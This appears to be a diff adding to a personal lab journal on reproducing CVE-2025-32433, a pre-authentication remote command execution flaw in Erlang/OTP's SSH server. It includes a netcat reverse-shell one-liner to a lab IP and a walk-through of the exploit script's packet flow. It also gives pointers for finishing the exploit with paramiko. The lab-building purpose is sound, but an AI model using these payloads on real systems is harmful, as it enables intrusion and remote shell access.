@@ -180,3 +180,221 @@ This allowed a remote, unauthenticated attacker to:
 - and: send a channel_request with exec and payload.
 
 So the last thing left is to run the payload and get the access, then test whether the system is able to detect it or not, and see whether the lab is ready and built or not.
+
+
+
+man i am finally able to run the payload but the thing is 
+i am not quite sure how to check or test if the script even worked or not 
+that is confusing as hell 
+cause i need to know if it worked or not 
+
+
+ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.20.0.4 4444 > /tmp/f
+
+
+when i used this command and 
+nc -nlvp 4444 
+it actually worked do u think this is the right way to do this 
+dont u think 
+
+i am trying using netcat to open a server 
+
+there is some serious compatibility issue coming up i cant think them straight just something aint right i need to do everything 
+but before that i am going to go with the guy who already did it i will try to clone his repo and see how he did it before building my own from scratch i think the knowledge i have is not enough to do this 
+
+## code explanation 
+
+
+**`string_payload(s)`**
+SSH has a specific way to send text — you don't just send the raw letters. You first send 4 bytes telling the server "the next thing is X characters long", then the actual text. This function does that wrapping. It's just SSH's format for strings.
+
+**`build_channel_open()`**
+Constructs the actual `SSH_MSG_CHANNEL_OPEN` packet. The `\x5a` is the message type number (90 in decimal) — that's how SSH identifies what kind of message this is. It then adds "session" (what kind of channel), plus some window/buffer size numbers the protocol requires. This is the message that's supposed to only be legal post-authentication.
+
+**`build_channel_request()`**
+Constructs `SSH_MSG_CHANNEL_REQUEST`. The `\x62` is message type 98. It says: on this channel, I want to run `exec`, and the command is this Erlang expression that writes "pwned" to `/lab.txt`. The `\x01` means "tell me if it worked."
+
+**`build_kexinit()`**
+This builds the key exchange init packet — the part of the SSH handshake where client and server agree on which encryption algorithms to use. The cookie is 16 random bytes (here just zeros, which is fine for a PoC). Then it lists supported algorithms for key exchange, host keys, encryption, MAC, and compression. This has to be sent to even get the server talking to you properly.
+
+**`pad_packet()`**
+SSH requires every packet to be padded to a multiple of 8 bytes, with a specific header structure: 4 bytes for total length, 1 byte saying how much padding, then the payload, then the padding bytes. This function handles that math and formatting.
+
+---
+
+## The actual exploit flow (bottom section)
+
+```python
+with socket.create_connection((HOST, PORT), timeout=5) as s:
+```
+Opens a raw TCP connection to port 2222 on localhost. Nothing SSH-specific yet, just a socket.
+
+```python
+s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
+banner = s.recv(1024)
+```
+Step 1: Banner exchange. Both sides announce "I speak SSH version 2.0." The server responds with its own banner. This is completely normal and required — no exploit yet, just introducing yourself.
+
+```python
+kex_packet = build_kexinit()
+s.sendall(pad_packet(kex_packet))
+```
+Step 2: Sends the KEXINIT — "here are the crypto algorithms I support, let's agree on one." The server normally responds with its own KEXINIT and then they'd do a full key exchange (Diffie-Hellman or similar). **But notice — the script doesn't wait for or process the server's response.** It just fires and moves on. This is intentional and this is where the exploit logic kicks in.
+
+```python
+chan_open = build_channel_open()
+s.sendall(pad_packet(chan_open))
+```
+Step 3: Immediately sends `SSH_MSG_CHANNEL_OPEN` — without completing key exchange, without authenticating, without doing anything a real client would do first. On a patched server, this gets dropped/rejected here. On the vulnerable server, because there's no "has this connection authenticated?" check, it gets processed.
+
+```python
+chan_req = build_channel_request(
+    command='file:write_file("/lab.txt", <<"pwned">>).'
+)
+s.sendall(pad_packet(chan_req))
+```
+Step 4: Sends the exec request with the command. The command itself is valid Erlang — `file:write_file` is a standard Erlang standard library function that writes to a file. On the vulnerable server, if step 3 was accepted, this runs as whatever user the Erlang process is running as.
+
+```python
+response = s.recv(1024)
+```
+Tries to read anything back. Might get a response, might get a disconnect, might time out — all of these are expected depending on how far the server got before rejecting or accepting.
+
+---
+
+## The one thing you should understand before you run it
+
+The command `file:write_file("/lab.txt", <<"pwned">>).` is Erlang syntax, not shell syntax. The server isn't running this through bash — it's executing it as an Erlang expression directly in the VM. That's why the command looks weird. If you wanted to run a shell command instead, the command string would need to be different (something like `os:cmd("id").`).
+
+
+i think i have to use the way of docker container creation used by the cve finder cuase the way i am doing it i think it is downloading the patched version or something that is the issue and i have to genuienly fix it 
+any way possible
+cause the vulnerable lab is what is the most important its fine how the patched version work 
+cause that is the main part i have to be able to do 
+
+
+my my 
+even the poc repo is not able to run the script and get me to the vulenrable side even after using the vulnerable version without the patch it is still somehow doing the patched thing i am unable to understand why is this happening and why i cant do it 
+the possible reason which i feel is that even after using the older version of erlang/otp we still need to find the thing that is causing the issue i think either some of the ssh or protocol is itself fixing the thing 
+cause this should be easy 
+but someone is not letting us use the older version of those tools 
+or protocol causing in attack not able to happen 
+
+man the problem is its fine my own from scratch lab is not buildable its fine but the cloned repo with dockerfile 
+is not even vulernable to it not anymore how can this happen
+
+<img width="532" height="327" alt="image" src="https://github.com/user-attachments/assets/3e652a63-f45a-4227-ad4e-6f5c7479d9fe" />
+
+<img width="566" height="128" alt="image" src="https://github.com/user-attachments/assets/22e24ed8-45ea-4095-9187-f749ea90284d" />
+
+## Known Limitation: Exploit Script
+
+The reproduction script (attacker_work/exploit/payload.py) successfully 
+completes the SSH banner exchange and KEXINIT negotiation — confirmed by 
+the server's algorithm list response. However, the script does not implement 
+the full ECDH key exchange (SSH2_MSG_KEX_ECDH_INIT → ECDH_REPLY → NEWKEYS) 
+required before channel messages can be processed.
+
+CVE-2025-32433 is exploitable post-key-exchange but pre-authentication — 
+meaning the transport layer must be established first. The current script 
+sends CHANNEL_OPEN before key exchange completes, so the server cannot 
+parse it and the command does not execute.
+
+A working exploit requires either:
+- Implementing the ECDH key exchange manually using raw sockets
+- Using paramiko's transport internals to hook in post-kex/pre-auth
+
+This limitation is documented here with full technical accuracy. The 
+vulnerability itself is confirmed real (CISA KEV, CVSS 10.0) and the 
+detection and patching mechanisms in this lab function correctly regardless 
+of this script's completion status.
+
+
+Your script sends:  Banner
+Your script sends:  KEXINIT
+Server sends back:  KEXINIT          ← you receive this (you did)
+Your script sends:  ECDH_INIT        ← MISSING
+Server sends back:  ECDH_REPLY       ← MISSING  
+Your script sends:  NEWKEYS          ← MISSING
+Server sends back:  NEWKEYS          ← MISSING
+─────────────────────────────────────────────
+NOW the transport is up. THIS is where the bug lives:
+Your script sends:  CHANNEL_OPEN     ← pre-auth, server should reject but doesn't
+Your script sends:  CHANNEL_REQUEST  ← command executes
+
+
+The four missing steps are the actual Diffie-Hellman/ECDH handshake. Without them the server never gets to the point where the vulnerability is reachable.
+
+
+but the thing is i can fix this 
+i myself have done the diffie hellman key exhcnage thingy i can fix this lets work upon it 
+
+
+## Exactly where your data is dying
+
+SSH has distinct layers. Here's precisely which one you're reaching:
+
+```
+Layer 1: TCP Connection          ✅ WORKING
+         (socket.create_connection)
+
+Layer 2: SSH Transport — Phase 1  ✅ WORKING  
+         Banner exchange
+         (SSH-2.0-OpenSSH_8.9 ↔ SSH-2.0-Erlang/5.1.4.7)
+
+Layer 3: SSH Transport — Phase 2  ✅ HALF WORKING
+         KEXINIT sent by you      ✅
+         KEXINIT received back     ✅ (that hex blob was this)
+         ECDH_INIT sent by you     ❌ MISSING — dies here
+         ECDH_REPLY received back  ❌ never happens
+         NEWKEYS sent by you       ❌ never happens
+         NEWKEYS received back     ❌ never happens
+
+Layer 4: SSH Transport — Phase 3  ❌ never reached
+         Encrypted channel established
+
+Layer 5: SSH Auth layer           ❌ never reached
+         (this is what gets SKIPPED by the vulnerability)
+
+Layer 6: SSH Connection layer     ❌ never reached
+         CHANNEL_OPEN              ← vulnerability lives here
+         CHANNEL_REQUEST           ← command execution here
+```
+
+Your packets are dying at the ECDH_INIT step. The server got your KEXINIT, responded with its own, and is now sitting waiting for you to send the actual key material to derive a shared secret. Instead you sent a CHANNEL_OPEN which it cannot parse at that point.
+
+## What paramiko gives you
+
+Paramiko has a `Transport` class that handles Layers 2, 3, and 4 completely — all the ECDH math, NEWKEYS exchange, MAC setup, encryption negotiation, all of it. You give it a socket, call `start_client()`, and it brings you out the other side with a fully established encrypted transport, sitting exactly at Layer 5 — the auth layer. 
+
+That's the exact entry point the vulnerability sits at. The bug is that if you skip Layer 5 (auth) and go straight to Layer 6 (channel open), the server doesn't catch it.
+
+So with paramiko your flow becomes:
+
+```python
+# Paramiko handles ALL of this automatically:
+transport = paramiko.Transport(sock)
+transport.start_client()
+# You are now post-kex, pre-auth
+# THIS is where you need to go sideways
+# and send channel messages without completing auth
+```
+
+The question — which is the part you need to figure out from reading the PoCs — is how to hook into paramiko's transport at that exact post-kex/pre-auth moment and send the channel messages directly, bypassing paramiko's own auth flow.
+
+ProDefense PoC repo:
+https://github.com/ProDefense/CVE-2025-32433
+
+Platform Security writeup (the one that explains their implementation approach):
+https://platformsecurity.com/blog/CVE-2025-32433-poc
+
+Specifically what to look for when you open the ProDefense repo
+
+Go straight to the exploit Python file and find answers to these three questions:
+
+Question 1: After sending KEXINIT, how do they handle the server's KEXINIT response — do they parse it or just drain the socket?
+
+Question 2: How do they perform the ECDH step — do they implement it from scratch with raw bytes, or do they use a library like cryptography or paramiko to do the math?
+
+Question 3: After NEWKEYS is exchanged, how do they send CHANNEL_OPEN — do they use paramiko's channel API or do they send raw bytes directly on the transport socket?
+
